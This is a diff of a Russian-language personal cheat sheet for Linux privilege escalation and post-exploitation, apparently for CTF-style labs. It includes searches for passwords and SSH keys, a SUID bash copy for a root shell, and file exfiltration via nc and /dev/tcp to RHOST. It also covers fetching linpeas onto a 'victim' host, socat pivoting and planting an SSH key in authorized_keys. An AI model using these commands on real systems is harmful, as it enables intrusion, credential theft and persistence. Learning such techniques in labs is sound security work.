@@ -1,17 +1,58 @@
 whoami
+who - кто в системе
+pwd - где я
 id
 cd /home && ls
-groups
+groups (можно повыситься через группы disk, docker)
+uname -m или file /bin/bash - узнать скольки битная система
 ls
 sudo -l
 ps auxf
+ps auxww | grep <user> - глянуть процессы от определенного пользователя
 
-netstat -tulnp
-ss -tulnp
+netstat -tulpan || ss -tulpan - покажет состояние соединений.
 
-find / -writable -type d 2>/dev/null | head #первые 10 совпадений
-grep -R "password" /etc 2>/dev/null | head 
-grep -R "passwd" /var/www 2>/dev/null | head
+journalctl -f - просмотр логов
+
+ls -l /etc/ssh/sshd_config - проверка конфига ssh, должен иметь права 644 root root
+
+find / -writable -type d 2>/dev/null | head #директории доступные для записи, первые 10 совпадений
+grep -iR "pass" /etc 2>/dev/null | head #быстрый поиск
+grep -iR "password" / 2>/dev/null | head 
+grep -iR "passwd" / 2>/dev/null | head
+
+Также стоит проверять в следующих директориях: /etc,/home,/root,/opt,/srv,/var/www,/var/lib,
+/var/backups,/usr/local/etc,/usr/local
+
+Проверка всего, что связано с cron:
+cat /etc/crontab
+ls -la /etc/cron*
+
+Искать утечки лучше в следующих директориях: /etc,/home,/root,/opt,/srv,/var/www,/var/lib,
+/var/backups,/usr/local/etc,/usr/local
+
+Также можно глянуть /var/log
+
+grep -iR <user> /etc 2>/dev/null - в каких файлах засветился пользователь
+
+Доступны ли бинарники с SUID битом:
+find / -perm -4000 -type f 2>/dev/null #смотреть на GTFOBins все бинарники
+-4000 - SUID (вып программу от имени владельца) - исп.файлы
+-2000 - SGID (вып программу от имени группы) - файлы/каталоги
+-1000 Sticky Bit - каталоги - (нельзя удалять, переименновывать файлы)
+0 - в контексте прав в опции -perm означает, что никаких требований.
+
+Разведка:
+find / -type f -perm -0002 2>/dev/null - файлы, доступные для записи всем
+find / -type d -perm -0002 2>/dev/null - каталоги, доступные для записи всем.
+find / -nouser 2>/dev/null - файлы без владельца (иногда остаются после удаления пользователей)
+find / -group <группа> -ls 2>/dev/null - ищет файлы/каталоги, которые пренадлежат группе, выводит коману ls
+
+SSH ключи:
+find / -name "id_rsa*" 2>/dev/null
+find / -name "*.pem" 2>/dev/null
+find / -name "authorized_keys" 2>/dev/null
+find / -name "id_ed25519" 2>/dev/null
 
 Передать linpeas на машину жертву способ 1:
 ip a (смотрим, запоминаем наш внешний айпи)
@@ -25,14 +66,102 @@ python3 -m http.server 80
 wget 10.10.15.31/linpeas.sh
 
 
-
+Проверка интересных дируеторий:
 cd /var
 cd /opt
 
 sudo -V
-Если 1.9.15-1.9.17 без патчей, то может сработать exploit (CVE-2025-32463) 
+Если 1.9.15-1.9.17 без патчей, то может сработать exploit (CVE-2025-32463)
+
+linpeas.sh - проверяет всю систему на возможные векторы эскалации привилегий, детальный
+pspy64 - может смотреть запускающиеся процессы
+LinEnum.sh тоже самое что linpeas, но более читаемый вывод.
+linux-exploit-suggester.sh - подсветит возможные CVE для ядра.
 
 Если мы видим, какую то cron задачу, где выполняется скрипт. То можем посмотреть, не предается ли пароль в аргументах команды.
 Для этого смотрим тот же ps aux или history
 
 
+Если недоступны vim и nano
+Создать файл
+cat > file.sh <<EOF
+строка
+строка
+EOF
+
+Дописать в файл
+cat >> file.txt <<EOF
+Еще одна строка
+EOF
+
+
+Добавить строку в конец файла:
+echo "world" >> file.txt
+
+
+Выявление хостов в сети:
+for i in $(seq 1 254); do (ping -c 1 192.168.122.$i); done | grep "bytes from"
+
+Скан портов через nc:
+for i in $(seq 1 65535); do (nc -zvn 127.0.0.1 $i 2>&1 | grep -v "Connection refused"); done
+
+
+Если есть возможность выполнять команды из под другого пользователя, но команды установления оболочки не работают:
+cp /bin/bash /tmp/shell; chmod 6755 /tmp/shell;
+/tmp/shell -p
+
+
+Альтернативный способ передачи файлов на хост:
+nc RHOST RPORT < backup - тот кто передает
+cat <файл> > /dev/tcp/RHOST/RPORT
+nc -lvnp 8082 > backup - слушатель
+
+Сделать себе из реверсшелла нормальный терминал:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl z - выйти с шелла в терминал
+stty raw -echo; fg
+Далее Enter 1-2 раза
+export TERM=screen или xterm
+в шелле жертвы: stty rows 50 columns 200 - подстроит окно шелла под размер терминала
+
+github со статическими бинарниками, для закидывания их на хост и дальнейшего развития атак:
+https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
+
+Пивотинг, когда недоступен ssh (используется утилита socat из репозитория со стат.бинарниками)
+На атакуемом хосте:
+./socat tcp-listen:LPORT,reuseaddr,fork tcp:RHOST:RPORT &
+На атакующем хосте:
+socat tcp-listen:LPORT,reuseaddr,fork tcp:RHOST:RPORT &
+
+
+Сгенерить ключ, подключиться по ssh:
+на атакующем хосту генерим ключи
+ssh-keygen -f isaac
+Появляются 2 файла (private key и pub key)
+pub key переносим на атакуемый хост в файл .ssh/authorized_keys, выдаем на него права chmod 600.
+с атакуемого хоста:
+выдаем chmod 600 на private key
+подключаемся ssh user@host -i <private key>
+
+
+утилиты для чтения файлов
+less
+strace
+strings
+strace - вывести системные вызовы
+strace -f - сис.вызовы + дочерние процессы
+strace -e - только конкретные вызовы
+ctrl shift f - для поиска в терминале, если вывод большой
+jd-gui - просмотр скомпилированного кода/файлов java
+
+Смотреть информацию о ядре:
+cat /etc/os-release ; uname -a
+обращать внимание на версию ядра.
+
+утилита для стеганографии: steghide
+steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss - извлекает данные из картинки/стего-файла с помощью пароля.
+
+
+Priv esc cheat sheet:
+https://github.com/gurkylee/Linux-Privilege-Escalation-Basics?ysclid=mudw6fb8hb148376729
+https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#checklists
